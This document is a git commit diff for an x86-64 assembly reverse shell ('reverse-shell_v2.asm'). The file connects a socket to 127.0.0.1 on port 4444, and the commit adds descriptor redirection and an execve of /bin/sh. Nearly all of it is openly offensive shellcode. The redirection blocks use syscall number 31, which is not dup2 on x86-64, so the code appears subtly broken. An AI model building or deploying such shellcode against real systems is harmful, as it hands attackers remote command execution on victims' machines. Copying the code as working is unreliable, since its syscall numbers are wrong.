12a683d8b8793fd60a3e9c8d12111ff416910096
gorgoroth7 <janissetcelian@gmail.com>
2025-06-13 23:34:30 +0200

    Update reverse-shell_v2.asm

--- reverse-shell_v2.asm
+++ reverse-shell_v2.asm
@@ -16,6 +16,8 @@ section .data
             at sin_port, dw 0x5c11
             at sin_addr, dd 0x100007f
         iend
+    binsh db "/bin/sh", 0
+    binsh_len equ $-binsh
 
 section .text
 
@@ -35,3 +37,35 @@ _connect_to_socket:
     mov rsi, sockaddr_struct_init
     mov rdx, 0x10
     syscall
+    jmp _file_descriptor_stdin
+
+_file_descriptor_stdin:
+mov rax, 31
+pop rdi
+push rdi
+mov rsi, 0
+syscall
+jmp _file_descriptor_stdout
+
+_file_descriptor_stdout:
+mov rax, 31
+pop rdi
+push rdi
+mov rsi, 1
+syscall
+jmp _file_descriptor_stderr
+
+_file_descriptor_stderr:
+mov rax, 31
+pop rdi
+push rdi
+mov rsi, 2
+syscall
+jmp _shell
+
+_shell:
+mov rax, 59
+mov rdi, binsh
+xor rsi, rsi
+xor rdx, rdx
+syscall
